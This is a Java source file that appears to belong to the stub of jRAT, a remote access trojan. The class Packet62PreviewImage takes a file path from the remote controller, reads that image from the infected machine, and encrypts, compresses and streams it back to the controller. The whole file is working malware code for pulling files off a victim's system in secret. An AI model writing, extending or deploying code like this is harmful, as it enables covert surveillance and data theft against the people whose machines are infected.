package io.jrat.stub.packets.incoming;

import io.jrat.common.compress.GZip;
import io.jrat.common.crypto.Crypto;
import io.jrat.stub.Connection;
import io.jrat.stub.Main;
import io.jrat.stub.packets.outgoing.Packet43PreviewImage;
import io.jrat.stub.utils.ImageUtils;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;


public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		BufferedImage screenShot = ImageIO.read(new File(file));
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));

		Connection.addToSendQueue(new Packet43PreviewImage(buffer.length, screenShot.getWidth(), screenShot.getHeight()));

		Connection.dos.write(buffer);

		Connection.lock();

		System.gc();

	}

}
